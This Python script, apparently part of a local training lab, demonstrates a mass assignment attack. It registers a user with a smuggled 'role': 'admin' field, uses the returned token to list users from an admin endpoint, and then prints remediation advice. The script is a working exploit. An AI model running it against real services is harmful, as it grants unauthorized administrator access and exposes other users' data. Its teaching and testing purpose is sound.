#!/usr/bin/env python3
"""
Privilege Escalation Attack via Mass Assignment

This script demonstrates how an attacker can register as an admin
by exploiting mass assignment vulnerability in the registration endpoint.
"""

import requests
import json
import sys

API_URL = "http://localhost:5000"

def print_banner():
    print("=" * 60)
    print("PRIVILEGE ESCALATION ATTACK - Mass Assignment")
    print("=" * 60)
    print()

def register_as_admin():
    """Attempt to register with admin role."""
    print("[*] Attempting to register with admin role...")
    
    payload = {
        "username": "hacker",
        "password": "hacked123",
        "email": "hacker@evil.com",
        "role": "admin"  # Malicious parameter
    }
    
    try:
        response = requests.post(
            f"{API_URL}/api/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code == 201:
            data = response.json()
            user = data.get('user', {})
            
            print(f"[+] Registration successful!")
            print(f"[+] Username: {user.get('username')}")
            print(f"[+] Role: {user.get('role')}")
            print(f"[+] Token: {data.get('token')[:50]}...")
            
            if user.get('role') == 'admin':
                print("\n[!] SUCCESS: Registered as ADMIN!")
                print("[!] Mass assignment vulnerability confirmed!")
                return data.get('token')
            else:
                print("\n[-] Role was not elevated to admin")
                return None
        else:
            print(f"[-] Registration failed: {response.status_code}")
            print(f"[-] Error: {response.json()}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

def verify_admin_access(token):
    """Verify admin access by accessing admin endpoint."""
    if not token:
        return False
    
    print("\n[*] Verifying admin access...")
    
    try:
        response = requests.get(
            f"{API_URL}/api/admin/users",
            headers={"Authorization": f"Bearer {token}"}
        )
        
        if response.status_code == 200:
            users = response.json()
            print(f"[+] Admin endpoint accessible!")
            print(f"[+] Retrieved {len(users)} users")
            print("\n[+] User details:")
            for user in users[:3]:  # Show first 3 users
                print(f"    - {user.get('username')} ({user.get('role')}): {user.get('email')}")
            return True
        else:
            print(f"[-] Admin endpoint not accessible: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def main():
    print_banner()
    
    # Check if API is running
    try:
        response = requests.get(f"{API_URL}/api/health")
        if response.status_code != 200:
            print("[-] API is not responding correctly")
            sys.exit(1)
    except requests.exceptions.RequestException:
        print(f"[-] Cannot connect to API at {API_URL}")
        print("[-] Make sure the lab is running: docker-compose up")
        sys.exit(1)
    
    # Attempt privilege escalation
    token = register_as_admin()
    
    if token:
        verify_admin_access(token)
        
        print("\n" + "=" * 60)
        print("ATTACK SUCCESSFUL!")
        print("=" * 60)
        print("\nVulnerability: Mass Assignment")
        print("Root Cause: Registration endpoint accepts 'role' parameter")
        print("Impact: Instant admin privilege escalation")
        print("\nRemediation:")
        print("  1. Whitelist allowed registration fields")
        print("  2. Server assigns role, never client")
        print("  3. Separate endpoint for role assignment (admin-only)")
        print("=" * 60)
    else:
        print("\n[-] Attack failed or vulnerability not present")

if __name__ == "__main__":
    main()
